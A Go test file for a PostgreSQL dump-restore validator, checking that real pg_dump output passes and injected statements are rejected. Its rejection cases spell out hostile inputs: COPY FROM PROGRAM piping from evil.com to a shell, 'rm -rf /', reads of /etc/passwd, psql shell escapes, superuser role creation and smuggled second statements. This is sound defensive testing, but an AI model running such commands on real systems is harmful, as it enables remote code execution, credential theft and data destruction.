package postgres_test

import (
	"context"
	"strings"
	"testing"
	"time"

	"github.com/evey-project/evey/internal/adapters/driven/postgres"
)

// TestCurrentSchemaVersion_ConnectionRefused verifies that CurrentSchemaVersion
// surfaces a connection error rather than silently returning an empty version
// when the database is unreachable. Port 19999 is used as a clearly unused
// port; the connection is refused immediately, so no timeout budget is consumed.
func TestCurrentSchemaVersion_ConnectionRefused(t *testing.T) {
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()
	d := postgres.NewDatabaseDumper("127.0.0.1", 19999, "u", "p", "db", "disable")
	_, err := d.CurrentSchemaVersion(ctx)
	if err == nil {
		t.Fatal("expected error on connection failure")
	}
}

// rejected reports whether the validator (not psql) refused the input.
func rejected(err error) bool {
	if err == nil {
		return false
	}
	m := err.Error()
	return strings.Contains(m, "rejected") || strings.Contains(m, "invalid file") || strings.Contains(m, "empty backup")
}

func TestRestoreTables_Validation(t *testing.T) {
	d := postgres.NewDatabaseDumper("localhost", 5432, "user", "pass", "db", "disable")
	ctx := context.Background()

	// --- valid data-only dumps must pass the validator (psql then fails: no DB) ---

	passes := map[string]string{
		// The whole-database dump restores sequence counters and clears the tables
		// before reloading; both must pass the allowlist.
		"setval sequence": "-- PostgreSQL database dump\n" +
			"SELECT pg_catalog.setval('public.a_seq', 42, true);\n",
		"truncate prefix then header": "TRUNCATE public.users, public.profiles, public.\"media_items\";\n" +
			"-- PostgreSQL database dump\n" +
			"COPY public.users (id) FROM stdin;\n\\.\n",
		"header + SET":    "-- PostgreSQL database dump\n\nSET statement_timeout = 0;\n",
		"leading comment": "--\n-- PostgreSQL database dump\n--\n\nSET statement_timeout = 0;\n",
		"full data-only grammar": "-- PostgreSQL database dump\n" +
			"SET statement_timeout = 0;\n" +
			"SET client_encoding = 'UTF8';\n" +
			"SELECT pg_catalog.set_config('search_path', '', false);\n" +
			"SET SESSION AUTHORIZATION DEFAULT;\n" +
			"\\restrict abc123\n" +
			"COPY public.users (id, name) FROM stdin;\n" +
			"1\talice\n2\tbob\n\\.\n" +
			"\\unrestrict abc123\n",
		"disable-triggers form": "-- PostgreSQL database dump\n" +
			"ALTER TABLE ONLY public.media_items DISABLE TRIGGER ALL;\n" +
			"COPY public.media_items (id) FROM stdin;\n\\.\n" +
			"ALTER TABLE ONLY public.media_items ENABLE TRIGGER ALL;\n",
		// Scary-looking text INSIDE copy data is data, not SQL - must NOT be rejected.
		"malicious-looking copy data is allowed": "-- PostgreSQL database dump\n" +
			"COPY public.logs (id, msg) FROM stdin;\n" +
			"1\tCOPY x FROM PROGRAM 'rm -rf /'\n" +
			"2\t\\! id\n" +
			"\\.\n",
	}
	for name, body := range passes {
		t.Run("PASS: "+name, func(t *testing.T) {
			if err := d.RestoreTables(ctx, strings.NewReader(body)); rejected(err) {
				t.Fatalf("valid dump was rejected: %v", err)
			}
		})
	}

	// --- structural rejections ---

	t.Run("missing header rejected", func(t *testing.T) {
		err := d.RestoreTables(ctx, strings.NewReader("-- not the dump\nSET statement_timeout = 0;\n"))
		if err == nil || !strings.Contains(err.Error(), "invalid file") {
			t.Fatalf("expected invalid file, got: %v", err)
		}
	})
	t.Run("empty rejected", func(t *testing.T) {
		err := d.RestoreTables(ctx, strings.NewReader(""))
		if err == nil || !strings.Contains(err.Error(), "empty backup") {
			t.Fatalf("expected empty backup, got: %v", err)
		}
	})
	t.Run("header at line 49 passes", func(t *testing.T) {
		var lines []string
		for range 48 {
			lines = append(lines, "-- comment line")
		}
		lines = append(lines, "-- PostgreSQL database dump", "SET statement_timeout = 0;")
		if err := d.RestoreTables(ctx, strings.NewReader(strings.Join(lines, "\n")+"\n")); rejected(err) {
			t.Fatalf("header at line 49 should pass, got: %v", err)
		}
	})

	// --- the disallowed-statement allowlist closes every known RCE/file vector ---

	dangerous := map[string]string{
		"TRUNCATE CASCADE":               "TRUNCATE users CASCADE;",
		"setval trailing SQL":            "SELECT pg_catalog.setval('x', 1); DROP TABLE y;",
		"setval subquery value":          "SELECT pg_catalog.setval('x', (SELECT max(id) FROM users));",
		"COPY TO PROGRAM":                "COPY users TO PROGRAM 'rm -rf /';",
		"COPY FROM PROGRAM":              "COPY users FROM PROGRAM 'curl evil.com|sh';",
		"COPY FROM PROGRAM lowercase":    "copy secrets from program 'cat /etc/passwd';",
		"COPY FROM file":                 "COPY users FROM '/etc/passwd';",
		"COPY TO file":                   "COPY users TO '/tmp/exfil';",
		"psql shell escape":              "\\! id",
		"psql client copy program":       "\\copy t from program 'id'",
		"psql include file":              "\\i /etc/passwd",
		"CREATE EXTENSION":               "CREATE EXTENSION plpython3u;",
		"CREATE FUNCTION sql":            "CREATE FUNCTION f() RETURNS int LANGUAGE sql AS $$ SELECT 1 $$;",
		"CREATE TRUSTED LANGUAGE":        "CREATE TRUSTED LANGUAGE plpythonu;",
		"DO block":                       "DO $$ BEGIN PERFORM 1; END $$;",
		"GRANT":                          "GRANT ALL ON DATABASE evey TO attacker;",
		"ALTER ROLE superuser":           "ALTER ROLE evey SUPERUSER;",
		"CREATE ROLE":                    "CREATE ROLE attacker SUPERUSER LOGIN;",
		"pg_read_file via SELECT":        "SELECT pg_read_file('/etc/passwd');",
		"arbitrary SELECT":               "SELECT * FROM users;",
		"INSERT":                         "INSERT INTO users VALUES (1, 'x');",
		"SET ROLE":                       "SET ROLE attacker;",
		"SET SESSION AUTHORIZATION role": "SET SESSION AUTHORIZATION 'postgres';",
	}
	for name, stmt := range dangerous {
		t.Run("REJECT: "+name, func(t *testing.T) {
			body := "-- PostgreSQL database dump\n\n" + stmt + "\n"
			err := d.RestoreTables(ctx, strings.NewReader(body))
			if err == nil || !strings.Contains(err.Error(), "rejected") {
				t.Fatalf("expected rejection, got: %v", err)
			}
		})
	}

	// A line the grammar allows must never carry a second statement: psql runs
	// every `;`-separated statement on the line (measured on psql 17).
	smuggled := map[string]string{
		"SET then DROP":                 "SET x=1; DROP TABLE users;",
		"SET then COPY FROM PROGRAM":    "SET statement_timeout = 0; COPY t FROM PROGRAM 'id';",
		"SET TO then COPY FROM PROGRAM": "SET x TO 'a'; COPY t FROM PROGRAM 'id';",
		"SET quoted value hides a semi": "SET x TO 'a;b';",
		"SET value opens a string":      "SET client_encoding = 'UTF8;",
		"SET backslash escape":          "SET x = 'a\\';",
		"SET value opens a comment":     "SET x = 1 /* ;",
		"SET role by assignment":        "SET role = attacker;",
		"SET session_authorization":     "SET session_authorization = 'postgres';",
		"set_config then DROP":          "SELECT pg_catalog.set_config('search_path', '', false); DROP TABLE users;",
		"set_config backslash value":    "SELECT pg_catalog.set_config('search_path', '\\', false);",
		"TRUNCATE then DROP":            "TRUNCATE public.t; DROP TABLE users;",
		"TRUNCATE open identifier":      "TRUNCATE \"t;",
		"ALTER TRIGGER then DROP":       "ALTER TABLE ONLY public.t DISABLE TRIGGER ALL; DROP TABLE users;",
		"COPY column list hides SQL":    "COPY public.t (a; DROP TABLE users; SELECT (1) FROM stdin;",
		"COPY open identifier":          "COPY public.t (\"a) FROM stdin;",
		"COPY then DROP":                "COPY public.t (a) FROM stdin; DROP TABLE users;",
	}
	for name, stmt := range smuggled {
		t.Run("REJECT: "+name, func(t *testing.T) {
			body := "-- PostgreSQL database dump\n\n" + stmt + "\n"
			err := d.RestoreTables(ctx, strings.NewReader(body))
			if err == nil || !strings.Contains(err.Error(), "rejected") {
				t.Fatalf("expected rejection, got: %v", err)
			}
		})
	}

	// Verbatim `pg_dump 17.11 --data-only --no-owner --no-privileges
	// --disable-triggers` output (quoted column, `;` inside COPY data).
	t.Run("PASS: real pg_dump 17 output", func(t *testing.T) {
		if err := d.RestoreTables(ctx, strings.NewReader(realPgDump17)); rejected(err) {
			t.Fatalf("real pg_dump output was rejected: %v", err)
		}
	})
	for _, line := range []string{
		"SET default_table_access_method = heap;",
		"SET default_tablespace = '';",
		"SET search_path = '', pg_catalog;",
		"TRUNCATE TABLE public.a, public.\"b c\";",
	} {
		t.Run("PASS: "+line, func(t *testing.T) {
			body := "-- PostgreSQL database dump\n" + line + "\n"
			if err := d.RestoreTables(ctx, strings.NewReader(body)); rejected(err) {
				t.Fatalf("legit line was rejected: %v", err)
			}
		})
	}

	// Multi-line evasion: a clean COPY block then injected SQL after `\.` must
	// still be caught (we return to strict validation after the data block).
	t.Run("REJECT: SQL injected after a COPY data block", func(t *testing.T) {
		body := "-- PostgreSQL database dump\n" +
			"COPY public.t (id) FROM stdin;\n1\n\\.\n" +
			"COPY public.t FROM PROGRAM 'id';\n"
		err := d.RestoreTables(ctx, strings.NewReader(body))
		if err == nil || !strings.Contains(err.Error(), "rejected") {
			t.Fatalf("expected rejection of post-COPY injection, got: %v", err)
		}
	})
}

const realPgDump17 = `--
-- PostgreSQL database dump
--

\restrict jgaZs3iu9blHO0kd1dxSdvXj34UMk0IcR8e8aWxRPLfp5phbQX6Gaa6Fooo1Qfm

-- Dumped from database version 17.11
-- Dumped by pg_dump version 17.11

SET statement_timeout = 0;
SET lock_timeout = 0;
SET idle_in_transaction_session_timeout = 0;
SET transaction_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SELECT pg_catalog.set_config('search_path', '', false);
SET check_function_bodies = false;
SET xmloption = content;
SET client_min_messages = warning;
SET row_security = off;

--
-- Data for Name: users; Type: TABLE DATA; Schema: public; Owner: -
--

SET SESSION AUTHORIZATION DEFAULT;

ALTER TABLE public.users DISABLE TRIGGER ALL;

COPY public.users (id, "user", name) FROM stdin;
1	a;b	x
\.


ALTER TABLE public.users ENABLE TRIGGER ALL;

--
-- PostgreSQL database dump complete
--

\unrestrict jgaZs3iu9blHO0kd1dxSdvXj34UMk0IcR8e8aWxRPLfp5phbQX6Gaa6Fooo1Qfm
`
